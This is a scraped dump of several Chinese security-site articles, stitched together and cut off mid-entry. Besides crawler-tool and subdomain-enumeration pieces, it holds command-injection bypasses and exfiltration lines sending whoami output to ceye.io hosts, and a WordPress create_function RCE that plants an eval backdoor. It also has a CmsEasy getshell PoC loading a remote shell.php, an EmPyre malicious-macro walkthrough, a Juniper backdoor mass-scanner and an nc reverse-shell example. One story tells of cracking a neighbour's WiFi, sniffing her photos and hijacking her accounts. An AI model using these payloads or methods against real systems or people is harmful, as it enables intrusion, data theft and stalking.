虽然没有自己写爬虫操作精准，但是学习成本低很多，下面就来介绍几款可视化的爬虫工具。集搜客GooSeeker使用集搜客不需要编程语言的基础，将要抓取的特定字段映射到工作台，建立好采集的规则，就能轻松将数据采集成功，整个过程简单明了。集搜客的特色是爬虫群功能，功能非常强大，可以直接在会员中心控制采集数量，控制采集时间，同时可以用多个爬虫采集同一网址，防止采集过于频繁IP被封，又能保证采集的速度，同时采集的数据可以直接入库，并导出，关键是集搜客还不限制采集的深度和广度，想多少采集多少。八爪鱼八爪鱼有个优点，可以下载现成的采集规则，如果不会写规则， 就直接用别人写的规则就好了， 进一步降低了使用爬虫的门槛。网络矿工网络矿工是一款基于C#开源的网络爬虫工具，注意，是开源。网络矿工遵循BSD开源协议，具备完整的UI交互、线程管理、采集匹配等，用户可以基于此扩展属于自己的采集器，而不受任何限制。 火车头火车头采集器界面比较清爽，并且内置了好几款皮肤，视觉效果不错。采集器内置了一些常用网站的采集规则，内容以门户网站为主，感觉用处不是太大。采集规则流程倒是蛮清晰的，自动获取地址链接也足够方便，缺点是一些结构复杂的页面无法获取到信息。神箭手平台神箭手平台和以上工具都不太一样，它是一个开发爬虫的平台，你可以自己开发爬虫并将爬虫托管到云端。神箭手的一些特性非常符合潮流，比如防屏蔽、开放的接口、图标分析功能，换句话说这其实已经是个开发工具了。更重要的是，它是一个爬虫市场，你可以出售自己的爬虫，或者在平台上购买需要的爬虫，这对于广大爬虫爱好者来说，多了一个交流和变现的途径。爬虫与反爬虫可视化爬虫工具的出现，让大量原本并不会写爬虫的人也能爬取数据，这就至少能造成两个后果，一是网站的数据丢失的概率更大，如果是商业数据的话，被竞争对手利用从而导致经济损失；二是越来越多的爬虫会对网站负载造成压力，严重者甚至会宕机。当然，对于普通用户来说， 无论是学习写爬虫还是学习使用可视化爬虫工具，都对自己的工作与生活有益。互联网的发展重新定义了很多规则，而爬虫的存在使得一些看起来非常困难的事情也变得容易起来，也让一些原本简单的事情变得复杂。","2016-09-04 12:42:31","Web安全","不会编程也能写爬虫？可视化爬虫工具是什么东东","http://nsoad.com/Article/web/20160904/350.html"
"5ccbfaa84f2f0a0a7a69c0a0","0x00 漏洞概述1.漏洞简介Sparkjava是一款小型的web框架，它能够让你以很少的代码构建出一个java web应用。近日，某国外安全研究人员发现其存在文件遍历漏洞，可以通过该漏洞","kong","先看一个例子本地测试环境：PHP 5.4.45 + Win&lt;?php    $command = 'dir '.$_POST['dir'];    $escaped_command = escapeshellcmd($command);    var_dump($escaped_command);    file_put_contents('out.bat',$escaped_command);    system('out.bat');?&gt;应该如何去绕过执行？escapeshellcmdhttp://php.net/manual/zh/function.escapeshellcmd.phpescapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。具体会转义哪些字符？https://github.com/php/php-src/blob/PHP-5.4.45/ext/standard/exec.c这些都会用^来取消其意义。也就是没办法用&amp; | 来执行其他命令，只能列目录。有这样的一个tip：执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。更多好玩的命令绕过linux下面tip特别多，在实战或者ctf中遇到最多的几个。1. 黑名单绕过执行ls命令：a=l;b=s;$a$bcat hello文件内容：a=c;b=at;c=he;d=llo;$a$b ${c}${d}2. 空格绕过绕过空格${IFS}或者在读取文件的时候利用重定向符&lt;&gt;最后就是别人fuzz的一个命令执行项目：https://github.com/ewilded/shelling3. 无回显无回显获取数据的需求还是挺大的，比如sql，xxe，xss等等，这个时候一般可以用dns/http通道来获取数据。linux:curl xxxx.ceye.io/`whoami`ping -c 1 `whoami`.xxxx.ceye.io可以获取数据，当前权限是root但是有一个特别恼火的事情就是特殊字符或者是空格出现的话，这时候可以通过一些编码来，比如base64curl http://xxxx.ceye.io/$(id|base64)windows:windows下很头疼，用起来并没有linux那么方便好用，比如curl、wget等等。http请求：for /F %x in ('whoami') do start http://xxx.ceye.io/%xdns请求：获取计算机名：for /F ""delims=\"" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.info获取用户名：for /F ""delims=\ tokens=2"" %i in ('whoami') do ping -n 1 %i.xxx.dnslog.infopowershell这么厉害，为啥不用它来base64一下数据。for /F %x in ('whoami') do powershell $a=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('%x'));$b=New-Object System.Net.WebClient;$b.DownloadString('http://xxx.ceye.io/'+$a);这样就也能获取到一个base64编码到命令结果啦～算是弥补一个小小的坑。ps:这个是用powershell2.0写的,其他版本未测试。但是如果没有powershell想要获取更多数据的话，还是比较麻烦的。比如获取d:\所有文件,遇上空格也是会被截断。for /F %x in ('dir /b D:\') do start http://xxx.ceye.io/%x4. 借他人之手来获取字符如果过滤了&lt;&gt;?，可以从已有的文件中获取自己需要的字符。当然如果服务器能外网的话，直接wget -o /tmp就好了。","2016-11-16 22:19:02","Web安全","命令执行和绕过的一些小技巧","http://nsoad.com/Article/web/20161116/790.html"
"5ccbfaa84f2f0a0a7a69c0a1","前言最近天好冷，论坛也有点冷清~~，写篇文章吧。打算把php中的敏感点写成个系列，前面说了宽字节注入和php反序列，今天来看看一个不算很常见的函数的锅------create_funct","blackhold","前言最近天好冷，论坛也有点冷清~~，写篇文章吧。打算把php中的敏感点写成个系列，前面说了宽字节注入和php反序列，今天来看看一个不算很常见的函数的锅------create_function()函数一、函数定义在PHP中使用create_function()创建匿名函数，seay大牛的解释很清楚，引用一下：获取参数, 函数体;拼凑一个”function _lambdafunc (参数) { 函数体;} “的字符串;eval;通过_lambdafunc在函数表中找到eval后得到的函数体, 找不到就出错;定义一个函数名:”\000lambda” . count(anonymous_functions)++;用新的函数名替换_lambdafunc;返回新的函数。其实我们只需要关注前三点即可，自己写个例子讲一下吧：&lt;?php  $id = $_GET['id'];$q = 'echo'.$id.'is'.$a."";"";$sy = create_function('$a',$q);?&gt;这个匿名函数相当于这样的创建函数过程:function niming($a){         echo $id.'is'.$a;}$a是匿名函数的参数，$q所指向的字符串的值是匿名函数的函数体正常情况下，我们会输入http://localhost/create_function.php?id=1 此类的url来进行访问，但是看了看上面的创建函数的过程，能不能做一些手脚呢？二、函数漏洞利用http://localhost/create_function.php?id=1;}phpinfo();/*访问之：woca，phpinfo()函数执行了！我们来分析一下执行过程，payload访问后相当于如下：function niming($a){  echo 1;}phpinfo();/*.'is'.$a;  }这就解释通了吧，我们用;}闭合了函数，phpinfo();后的/*会注释掉之后的代码，而我们之前说过，create_function函数是调用了eval的，所以phpinfo()函数得以执行。三、wp下代码执行漏洞的复现复现下wordpress代码执行的漏洞，方便起见，读者可下载wp&lt;=4.6.1的中文版（内置了中文语言包）复现安装不再多说了，别忘了安装之前建立个数据库就行，我们直接定位到漏洞产生处： 代码wp-includes/pomo/translations.php： 代码如下：/**         * Makes a function, which will return the right translation index, according to the         * plural forms header         * @param int    $nplurals         * @param string $expression         */        function make_plural_form_function($nplurals, $expression) {                $expression = str_replace('n', '$n', $expression);                $func_body = ""                        \$index = (int)($expression);                        return (\$index &lt; $nplurals)? \$index : $nplurals - 1;"";                return create_function('$n', $func_body);        }出现了create_function()函数，看看函数体可不可以利用：$func_body = ""\$index = (int)($expression);return (\$index &lt; $nplurals)? \$index : $nplurals - 1;"";  可以看到$expression等参数并没有过滤，那么参数是从哪里传过来的呢？看看注释plural forms header 这是对字体文件的操作，参数来源于 wp-content\languages\zh_CN.po""Plural-Forms: nplurals=1; plural=0这行就是上面的函数体接收的两个参数 那我们来修改一下：""Plural-Forms: nplurals=1; plural=0);}eval($_GET[w]);/*""原理不用我多说了，和我前面举得例子基本一致： );}闭合了函数，eval($_GET[x]);执行后门代码，/*注释后面代码，相当于：p.s：用notepad++修改后，再用poedit程序打开保存，因为wp调用的是mo文件，是po文件编译后的执行文件，用poedit保存后才能编译更新mo文件（如下图设置：文件--首选项--把保存自动编译mo文件勾选上，这样我们保存po文件即可编译mo文件供wp加载调用）。由于访问每个文件时都要用这个对字体文件解析的结果对文件进行翻译，所以我们访问任何文件都可以触发这个payload别人复现时的解释，我们来看看执行情况：复现成功，代码执行了。四、总结关于wp&lt;=4.6.1代码执行漏洞的复现过程都大同小异，给出参考： https://www.seebug.org/vuldb/ssvid-92459 读者嫌搭建环境麻烦，可以在i春秋试验机上做实验 http://www.ichunqiu.com/course/56013 重点还是理解create_function()函数的执行过程吧，要想避免此类的错误i，简单的方法可以做一个黑名单，过滤函数体中可控的变量 给出参考：$not_allowed = array("";"", "")"", ""}"");$experssion = str_replace($not_allowed, """", $expression);","2016-11-03 14:36:05","Web安全","解析create_function() && 复现wp","http://nsoad.com/Article/web/20161103/687.html"
"5ccbfaa84f2f0a0a7a69c0a2","无线路由器被蹭网后，有被黑的风险吗？其实这个问题可以理解为：蹭网之后，能做些什么？这个问题也可以理解为：上了不安全的wifi后，还有没有任何隐私？","congtou","无线路由器被蹭网后，有被黑的风险吗？其实这个问题可以理解为：蹭网之后，能做些什么？这个问题也可以理解为：上了不安全的wifi后，还有没有任何隐私？不少人的八卦心窥探欲还是很强烈的，强烈到让人恐惧。所以很多人喜欢看一些八卦文章，比如：如何优雅的窥探别人？声明： 这是一个虚构故事，图片均加万恶马赛克。看你们以后还敢不敢上不安全的WIFI。。。记忆中隔壁是一个还算不错的妹子，那天Z来找我的时候恰巧碰到了，进屋后跑到我耳边说：“隔壁那个妹子你能不能要到微信，我觉得挺不错的呢~”这么三俗的场景竟然发生在我的身边，我说等两天我给你消息。入口既然是住在隔壁的年轻人，必然不可缺少的就是路由器，于是我打算从路由器当做入口开始这次旅程，将wifi打开后发现了三个信号，我首先选择这个名字非常独特的路由： ** LOVE **根据名字** LOVE **可大概看出两个人名，应该是男朋友，想到这心里为Z君凉了一半。找到疑似对方入口的地方就好说了，翻出minidwep（一款linux下破解wifi密码的工具）导入部分密码字典，开始进行爆破。因对方使用WPA2加密方式，所以只能使用暴力破解方式进入，WEP则目前可以直接破解密码，所以破解WPA2加密方式的路由基本上成功率取决于黑客手中字典的大小。喝了杯咖啡回来，发现密码已经出来了：198707**，于是愉快的连接了进去。困难成功连接到对方路由后，下面我需要做的就是连接路由的WEB管理界面（进入WEB路由管理界面后便可以将路由DNS篡改、查看DHCP客户端连接设备以及各种功能）。查看网段后开始访问路由器WEB管理界面，发现女神竟然机智的修改了默认登录帐号密码。TP-LINK W89841N，通过路由设备漏洞进入失败后，想必只能使用暴力美学了。通过抓取登录路由器的请求，然后遍历帐号密码发送请求查看返回数据包大小则判断是否登录成功，抓到的GET请求如下：其中：Authorization: Basic YWRtaW46YWRtaW4= 为登录的帐号密码使用Base64解密开查看内容：admin:admin于是我编写了一个python脚本将字典中的密码与“admin:”进行组合然后进行base64加密，进行破解。十一点的钟声响起，发现密码已经成功爆破出来，成功登录：查看设备连接列表，发现只有孤零零的自己，看来女神早已歇息，等待时机。时机第二天晚饭过后，登录路由管理界面，这时已经有好几个设备了，时机到了：客户端名android-b459ce5294bd721fandroid-44688379be6b9139**********iPhone******-iPad******-PC我统计了一下，设备为两个安卓设备、一部Iphone、一个ipad、一台个人PC。从iphone\ipad\pc命名来看，我开始的猜测没错，**确实是路由主人的名字，直觉告诉我非常大的可能这个路由的主人就是Z所心仪的女神。首先测试两台安卓设备，发现其中一台开放端口很多，隐隐约约中感觉是一台小米盒子或者百度影棒这种产品，这样事情就变得有趣了，因为控制电视可就有机会了。使用ARP嗅探安卓开放端口较多的设备，果然是一个影视盒子：最后基本摸清：电视使用影视盒子，iPhone，iPad以及一台个人电脑。寻找找到了那么多有趣的东西，但我仍然没有忘记Z让我帮忙的事情，于是便开始对iphone进行了嗅探。嗅探不一会便找到了有趣的东西，女神的照片在她查看自己相册的时候已经被嗅探到，于是我将照片发给了Z，他已经激动的语无伦次了。之后我仍然在等待机会，寻找到对方的微信以便我完成Z的愿望，希望出现了。查看流量日志的时候我发现她在刷新浪微博，于是根据URL很方便的找到了微博：看到生日让我想起了wifi连接密码，原来是她的出生日期，心想把微信找到就可以让Z安心了。通过女神新浪微博个性化域名地址和获取到信息加以组合，开始猜测微信帐号，很快便搞定了：将Z的心愿完成后，回过头发现还有很多有趣的事情没做，怎能轻易结束。电视随着时代的进步科技的发展，互联网逐渐到了物联网层度，从电视使用各种智能盒子便可以看出。影视盒子通常为了方便调试而开启远程调试端口，盒子究竟安全吗？去年腾讯安全送的小米盒子让我有幸好好研究一番，扫描端口后发现各种各样的端口大开，其中最有趣的就是5555端口（adb远程调试），使用adb connect ip 直接可连接设备进行远程调试。虽然是Z的女神，但是我想也可以调侃一番，于是我随手写了一个安卓APK程序。adb远程连接到盒子，然后adb install远程安装apk，最后使用am start -n ***进行远程启动。我本地使用Genymotion建立android模拟器进行测试：当输入am stat - n *** 敲击回车的那一刹那，脑海中曾想象过千万种女神的表情。但我始终没有忍下心来给电视播放爱情动作片。账户微博、人人、淘宝等等凡是登录过后的帐号全部劫持，通过劫持后的帐号又能看到许多表面看不到的东西。于是理所当然的账户全部被劫持掉了，当然我并没有去翻阅什么东西，窥探欲早已麻痹。联系我想是时候做一个结束了，当然故事过程中还有很多有趣而又精彩的东西实在无法用言语来表达。于是我没有恶意的拿她的微博发了一条消息：hey,test通过MITM中间人我又向网页中注入了javascript，大概是这样的：alert(/早点休息，QQ:***/);故事结束了，追溯源头，其实无非就是很常见的蹭网，连接wifi之后设备处于同一个局域网中，于是才能做出那么多有趣的事情，上面这个故事中我未曾有过恶意以及DNS劫持，那么我通过路由究竟控制或者得到了哪些信息：当然这个QQ是我为了取得对方最后联系而注册的：故事结束了，追溯源头，其实无非就是很常见的蹭网，连接wifi之后设备处于同一个局域网中，于是才能做出那么多有趣的事情，上面这个故事中我未曾有过恶意以及DNS劫持，那么我通过路由究竟控制或者得到了哪些信息：微博微信人人网QQ号码手机号（淘宝获取）照片电视More常说不要连接陌生公开WIFI，有点儿安全意识。不是没办法黑你，只是你没有被黑的价值。但是人们总是毫不在意，常说我本来就没啥价值。这样放弃治疗的人令你头疼。防御作为小白用户，下面几点做到的越多，你就越安全：1、路由器连接密码要复杂一点，比如testak47521test要比ak47521好很多2、赶紧把路由器管理后台的帐号和密码改掉。90%的懒人还在admin admin3、不要告诉不可信人员你的Wi-Fi密码。4、移动设备不要越狱不要ROOT，ROOT/越狱后的设备等于公交车随便上5、常登陆路由器管理后台，看看有没有连接不认识的设备连入了Wi-Fi，有的话断开并封掉Mac地址。封完以后马上修改Wi-Fi密码和路由器后台帐号密码。6、绑定IP MAC地址7、More雷锋网提示：上面这些方法都搜索的到，防御ARP劫持嗅探很简单，电脑上装个杀软基本就差不多，被攻击劫持时候会弹出警告，但是人们却丝毫不当回事儿，出现弹框就把杀软给关掉了，继续上网冲浪。","2017-04-09 12:14:29","无线安全","黑客攻下隔壁女神路由器后：竟做了这些事","http://nsoad.com/Article/wifi/20170409/1132.html"
"5ccbfaa84f2f0a0a7a69c0a3","MacBook Pro、Air、 Apple TV、iPhone、iPad、Apple Music&hellip;.，我虽然是个苹果脑残粉，但是在安全方面，我还是不愿相信苹果的“神话”。为了解人们对苹果系","Kong","MacBook Pro、Air、 Apple TV、iPhone、iPad、Apple Music….，我虽然是个苹果脑残粉，但是在安全方面，我还是不愿相信苹果的“神话”。为了解人们对苹果系统的安全看法，我在Facebook群组中，以话题“你觉得Mac或iMacs系统需要安装杀毒软件吗？”发起了一项调查。结果让人吃惊，在150多人中，有90%认为Mac系统不需要安装AV，大多数观点认为“Mac系统不会感染恶意软件”、“Mac恶意软件需要权限才能感染”等等。其实，Mac系统和Windows面临相同的安全风险，不明软件、木马和病毒一样可以黑掉Mac系统。好吧，让我们来展示一下利用EmPyre，配合恶意文档黑掉 Mac OSX 系统。EmPyre是一款基于Python，远程入侵OSX系统的Post Exploitation框架工具。它内置有OSX漏洞利用模块，与Metasploit相比，让人耳目一新。 视频：How To Hack Mac OSX with Empyre安装Git Clone from https://github.com/adaptivethreat/EmPyre/进入EmPyre目录运行安装脚本开始创建 Listener开始为受害系统创建回连监听进程进入Listener菜单，键入options查看信息其中，默认Listener进程为test，其它信息可以根据目标系统进行设置修改设置完毕就可以运行创建恶意文件 首先，我们需要创建恶意office宏文档。键入命令”main”回到主菜单，并使用“usestager”命令调用宏文档制作功能我们只需告诉stager使用哪个我们创建的listener进程，然后就可以生成恶意宏代码把这些输出的宏代码复制到word或excel宏文档中保存。如果攻击目标是64    位系统，需要把宏代码第1行“Private Declare Function“更改为”Private Declare PtrSafe Function”    。当受害者打开该恶意文档，会出现以下宏调用界面，如果点击enable macros按钮之后，恶意宏代码将会执行。10多秒之后，在EmPyre界面下可以通过agent查看回连信息UKFOM…字符串是EmPyre对受害主机的独特标识，之后，可以使用以下命令控制主机以下是一些可以利用的控制模块，其中troll/osx/say是我最喜欢用的当然，你还可以使用help命令查看其它控制、执行和查询功能现在，我们得考虑一下这个问题：到底Mac系统需要安装杀毒软件吗？虽然苹果系统的恶意软件相对于Windows平台较少，但安全风险总是共存和相同的，攻击者可以以相同的攻击手法入侵Mac系统。杀毒软件可能对某些定向攻击来说不具防护效果，但是，随着攻击复杂度和OSX用户群体的不断增加，杀毒软件可能是用户安全防护的基本防线。","2016-11-08 17:10:24","安全工具","Mac OSX系统下的渗透利用工具Empyre","http://nsoad.com/Security-tools/20161108/tools-722.html"
"5ccbfaa84f2f0a0a7a69c0a4","前言本文适合Web安全爱好者，其中会提到8种思路，7个工具和还有1个小程序，看本文前需要了解相关的Web基础知识、子域名相关概念和Python 程序的基础知识。感谢我的好友龙哥","Kong","前言本文适合web安全爱好者，其中会提到8种思路，7个工具和还有1个小程序，看本文前需要了解相关的Web基础知识、子域名相关概念和Python 程序的基础知识。感谢我的好友龙哥的技巧大放送以及Oritz分享的小程序~首先我们引用一句名言作为开篇：在渗透测试中，信息搜集能力的差距，不明显，也最明显。这句话是龙哥说的，而在技术分享上，我们觉得授之以鱼之前，更重要的是授之以渔。因此本篇文章首先进行子域名搜集思路的梳理，抛砖引玉，然后介绍一下常用的工具，最后分享一个基于 HTTPS 证书的子域名查询小工具。思路梳理及操作图示1、Web子域名猜测与访问尝试最简单的一种方法，对于 Web 子域名来说，猜测一些可能的子域名，然后浏览器访问下看是否存在。2、搜索引擎查询比如  site:163.com3、查询DNS的一些解析记录如查询 MX、CNAME 记录等比如用 nslookup 命令nslookup -qt=any bing.com还有一种基于DNS查询的暴力破解，举个栗子，比如用 nslookup 命令挨个查询猜测的子域名，看能否查询到结果。4、爬虫爬取页面提取子域名可以利用爬虫从页面源代码中提取子域名以 burp 的爬虫为例：5、crossdomain.xml 文件6、通过 IP 反查（类似于旁站查询）至于 IP 如何获取，也会有一些玩法，有机会咱们再梳理。7、通过 HTTPS 证书搜集8、一些漏洞的利用如： DNS 域传送漏洞常用工具梳理1、在线工具有很多子域名的查询站点，可以搜索“子域名查询”寻找，如：1）http://i.links.cn/subdomain/ 可查询二级、三级等子域名2）http://dns.aizhan.com/ 查询同 IP 绑定了哪些域名3）https://crt.sh/ 根据 HTTPS 证书查询子域名2、本地工具1）Layer 子域名挖掘机2）wydomain猪猪侠：https://github.com/ring04h/wydomain3）subDomainsBrutelijiejie:https://github.com/lijiejie/subDomainsBrute4）Sublist3raboul3la: https://github.com/aboul3la/Sublist3r小程序分享最后分享下团队小伙伴 Oritz 写的基于 HTTPS 证书的子域名收集练习小程序 “GetDomainsBySSL.py” ，程序异常处理之类的还没完善，感兴趣的小伙伴可以当做例子继续开发哦。下载链接：Youdao程序原理：集成了 crt.sh 和 Google 的查询接口，以及调用 OpenSSL 去解析 HTTPS 证书的信息（需要说明的是，Google 的查询接口可能需要代理访问，而 OpenSSL 模块在 Linux 下通常自带）。程序依赖的模块：1）lxml：https://pypi.python.org/pypi/lxml/2.3/2）OpenSSLWindows下运行（没有OpenSSL的情况运行）：Linux下运行（kali自带了OpenSSL模块）：好了，时间过得真快，又到了说再见的时候。今天的小分享就到这里，一句话概括就是8 种思路，7 个工具，还有 1个小程序，欢迎交流讨论哦~","2016-10-20 14:45:15","Web安全","子域名搜集思路与技巧梳理","http://nsoad.com/Article/web/20161020/610.html"
"5ccbfaa84f2f0a0a7a69c0a5","关于安全开发的一些思考之前面试某宝的时候，某人问过我，如果解决开发不懂安全的问题，就比如说SSRF,XEE这样的漏洞，一旦发生安全事故，应该立刻去响应，并帮助开发人员修","Kender","简要描述CMSEasy官方在2016-10-12发布了一个补丁,描述只有两句话前台getshell漏洞修正；命令执行漏洞修正；我们就根据补丁来分析一下这个前台Getshell漏洞。          漏洞详情在补丁页面http://www.cmseasy.cn/patch/show_1116.html下载补丁CmsEasy_for_Uploads_20161012.zip修改的文件不多，通过diff发现补丁中lib/default/tool_act.php 392行的cut_image_action()函数被注释了。来看看这个函数/*function cut_image_action() {    $len = 1;    if(config::get('base_url') != '/'){        $len = strlen(config::get('base_url'))+1;    }    if(substr($_POST['pic'],0,4) == 'http'){        front::$post['thumb'] = str_ireplace(config::get('site_url'),'',$_POST['pic']);    }else{        front::$post['thumb'] = substr($_POST['pic'],$len);    }    $thumb=new thumb();    $thumb-&gt;set(front::$post['thumb'],'jpg');    $img=$thumb-&gt;create_image($thumb-&gt;im,$_POST['w'],$_POST['h'],0,0,$_POST['x1'],$_POST['y1'],$_POST['x2'] -$_POST['x1'],$_POST['y2'$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));    $save_file='upload/images/'.date('Ym').'/'.$new_name;    @mkdir(dirname(ROOT.'/'.$save_file));    ob_start();    $thumb-&gt;out_image($img,null,85);    file_put_contents(ROOT.'/'.$save_file,ob_get_contents());    ob_end_clean();    $image_url=config::get('base_url').'/'.$save_file;    //$res['size']=ceil(strlen($img) / 1024);    $res['code']=""                    //$('#cut_preview').attr('src','$image_url');                    $('#thumb').val('$image_url');                    alert(lang('save_success'));    "";    echo json::encode($res);}*/看保存文件名的生成$new_name=$new_name_gbk=str_replace('.','',Time::getMicrotime()).'.'.end(explode('.',$_POST['pic']));直接用了$_POST['pic']的后缀做为新文件的扩展名，应该就是这里导致的getshell。不过这里利用需要一点技巧 1、图片会经过php的图像库处理，如何在处理后仍然保留shell语句2、远程加载图片需要通过file_exists函数的验证(要知道http(s)对于file_exists来说会固定返回false)在正常图片中插入shell并无视图像库的处理 这个freebuf有介绍 国外也有不少分析，当然直接拿freebuf的方法应该是不成功的 需要一点小小的调整关于file_exits()函数 ftp://协议就可以绕过 wrappers中有介绍http://p2.qhimg.com/t012bdbca2b40510d28.png$len = 1;5.0.0以上 就支持file_exists()了这里构造payload还有一点需要注意的if(config::get('base_url') != '/'){    $len = strlen(config::get('base_url'))+1;}if(substr($_POST['pic'],0,4) == 'http'){    front::$post['thumb'] =    str_ireplace(config::get('site_url'),'',$_POST['pic']);}else{    front::$post['thumb'] = substr($_POST['pic'],$len);}如果$_POST['pic']开头4个字符不是http的话，就认为是本站的文件，会从前面抽取掉baseurl（等于返回文件相对路径）。所以构造的时候 如果站点不是放在根目录 则需要在前面补位strlen(base_url)+2 如果放在根目录 也需要补上1位（'/'的长度）。POCPOST /index.php?case=tool&amp;act=cut_imagepic=111111111ftp://ludas.pw/shell.php&amp;w=228&amp;h=146&amp;x1=0&amp;x2=228&amp;y1=0&amp;y2=146本地测试截图","2016-11-04 15:42:32","Web安全","CmsEasy前台无限制GetShell","http://nsoad.com/Article/web/20161104/699.html"
"5ccbfaa84f2f0a0a7a69c0a6","成功登录PhpMyadmin后可以直接执行命令，是攻击者从Phpmyadmin突破获取权限的又一姿势。#!/usr/bin/env python""""""cve-2016-5734","blackhold","Censys是一款用以搜索联网设备信息的新型搜索引擎，安全专家可以使用它来评估他们实现方案的安全性，而黑客则可以使用它作为前期侦查攻击目标、收集目标信息的强大利器。其功能与十分流行的Shodan十分相似，然而与Shodan相比其优势在于这是一款免费的搜索引擎，最初由密歇根大学的研究人员在10月发行，目前由谷歌提供支持。关于Censys的具体介绍可参考http://www.freebuf.com/news/89285.htmlJuniper高级副总裁兼首席信息安全官Bob Worrall称，在最近的内部代码审计过程中发现了两枚漏洞，影响ScreenOS 6.2.0r15—6.2.0r18，6.3.0r12—6.3.0r20版本。其中一个是未授权代码漏洞，可解密VPN流量；另外一个可允许攻击者通过SSH或者telnet远程管理访问设备。Juniper提到这些系统的访问会被记录，密码认证也会成功，但是攻击者可改变或者删除日志条目。关于漏洞具体介绍可参考http://www.freebuf.com/news/90323.html了解到该漏洞后我尝试着使用Censys搜索可能存在后门的主机并批量进行验证。在完成这项工作之前请先让我带领大家大体了解一下Censys中API的使用方法。首先，你需要有一个帐号，Censys是免费开放注册的，所以这个应该很简单。注册好后在我们的账户页面可以看到Censys为我们每人分配了一个APIID和一个Secret，另外我们还注意到下面有一个搜索频率的限制，使用API的话每5分钟只能搜索120次，这个问题我们下面再处理。打开API页面，我们看到，Censys提供了search、view、report、query、export以及data六种API接口。在提供的API方法中，我们使用最多的应该就是search了，所以，我大体介绍一下search的使用方法。search接口的请求地址是https://www.censys.io/api/v1/search/?，其中?的地方可以是ipv4、websites或者certificates，分别代表搜索ipv4主机、网站和证书。我们的POST请求应该是一组包含query、page、fields的json数据，其中query指的是相应的搜索语句；page代表返回的页码，Censys总是返回一页的数据，即如果你page设置的5，那么其返回的并不是前5页的数据，而是第5页的数据；fields指的是你希望返回值中包含哪些字段，具体包含哪些字段你可以自己去看一下。通过上面的介绍我们就可以使用Censys来获取数据了，比如说如果你想获取所有apache的服务器，你可以像下面这样来构造代码：import sysimport jsonimport requests   API_URL = ""https://www.censys.io/api/v1""UID = ""YOUR API ID""SECRET = ""YOUR SECRET""data = {    ""query"":""80.http.get.headers.server: apache"",     ""page"":1,     ""fields"":[""ip"", ""location.country""]}res = requests.post(API_URL + ""/search/ipv4"", data=json.dumps(data), auth=(UID, SECRET))results = res.json()if res.status_code != 200:    print ""error occurred: %s"" % results[""error""]    sys.exit(1)for result in results[""results""]:    print ""%s in %s"" % (result[""ip""], result[""location.country""][0])当然，上面一段代码只返回了第一页的数据，如果你想获得大量数据可以设置一个page变量循环获取，注意：page要从1开始循环而不是从0哦。当然，这样的话问题就来了，Censys只允许我们每5分钟请求120次，直接遍历的话会出现错误，因此我添加了一个延时器，如果一次请求所用的时间少于2.5秒，我就延时剩余的时间，否则的话就直接进行下一次查询。当然，你或许会有更好的方法来解决这个问题。介绍完Censys，就应该进入正题了，其实检查设备是否有后门就是看该主机可不可以使用user = “root”，password = “&lt;&lt;&lt; %s(un=’%s’) = %u”登录其SSH。我使用了pexpect模块的pxssh来登录远程SSH，具体代码如下：def connectSSH(host, user, passwd):try:    ssh = pxssh.pxssh()    ssh.login(host, user, passwd, auto_prompt_reset = False)    return sshexcept Exception, e:    print ""%s is not vul"" % host其实由于登录后并不是传统的SSH，而是该防火墙的操作终端，因此pxssh会认为并没有登录成功，而是返回超时异常，此时我们检测其返回的before字段如果有Remote Management Console字样就说明该主机存在后门。整合其所有代码并加入多线程进行优化后，我们就可以实时获取可能存在后门的主机并对其进行检测了，整合后的代码地址：https://github.com/s0m30ne/JuniperBackdoor* 原创作者：阿金，本文属FreeBuf原创奖励计划，未经许可禁止转载","2016-08-01 05:18:00","Web安全","利用Censys批量获取Juniper Netscreen后门","http://nsoad.com/Article/web/20160801/246.html"
"5ccbfab24f2f0a0a7a69c0a7","PowerShell-Suite是b33f创建的一个GitHub项目，主要收集了目前神器级别的PowerShell攻击脚本。所以个人感觉很值得向大家详细介绍一下里面各个脚本的使用方法。","kong","PowerShell-Suite简介PowerShell-Suite是b33f创建的一个GitHub项目，主要收集了目前神器级别的PowerShell攻击脚本。所以个人感觉很值得向大家详细介绍一下里面各个脚本的使用方法。Windows API这里主要介绍了调用了Windows API的PowerShell脚本。Invoke-Runas功能等同于Windows下的runas.exe，调用Advapi32::CreateProcessWithLogonW。Start cmd with a local account.C:\PS&gt; Invoke-Runas -User SomeAccount -Password SomePass -Binary C:\Windows\System32\cmd.exe -LogonType 0x1Start cmd with remote credentials. Equivalent to ""/netonly"" in runas.C:\PS&gt; Invoke-Runas -User SomeAccount -Password SomePass -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType 0x2Invoke-NetSessionEnum调用Netapi32::NetSessionEnum去枚举域内计算机的活动会话。Enumerate active sessions on ""SomeHostName"".C:\PS&gt; Invoke-NetSessionEnum -HostName SomeHostNameInvoke-CreateProcess调用Kernel32::CreateProcess实现对进程的精准控制。Start calc with NONE/SW_SHOWNORMAL/STARTF_USESHOWWINDOWC:\PS&gt; Invoke-CreateProcess -Binary C:\Windows\System32\calc.exe -CreationFlags 0x0 -ShowWindow 0x1 -StartF 0x1Start nc reverse shell with CREATE_NO_WINDOW/SW_HIDE/STARTF_USESHOWWINDOWC:\PS&gt; Invoke-CreateProcess -Binary C:\Some\Path\nc.exe -Args ""-nv 127.0.0.1 9988 -e C:\Windows\System32\cmd.exe"" -CreationFlags 0x8000000 -ShowWindow 0x0 -StartF 0x1Detect-Debug使用多种技术来检查调试器是否存在。Sample below is x64 Win8, WinDbg attached to PowerShell.C:\PS&gt; Detect-Debug[+] Detect Kernel-Mode Debugging    [?] SystemKernelDebuggerInformation: False[+] Detect User-Mode Debugging    [?] CloseHandle Exception: Detected    [?] IsDebuggerPresent: Detected    [?] CheckRemoteDebuggerPresent: Detected    [?] PEB!BeingDebugged: Detected    [?] PEB!NtGlobalFlag: Detected    [?] DebugSelf: DetectedGet-Handles调用NtQuerySystemInformation::SystemHandleInformation去获取指定进程的句柄列表。Get handles for PID 2288C:\PS&gt; Get-Handles -ProcID 2288[&gt;] PID 2288 --&gt; notepad[+] Calling NtQuerySystemInformation::SystemHandleInformation[?] Success, allocated 449300 byte result buffer[&gt;] Result buffer contains 28081 SystemHandleInformation objects[&gt;] PID 2288 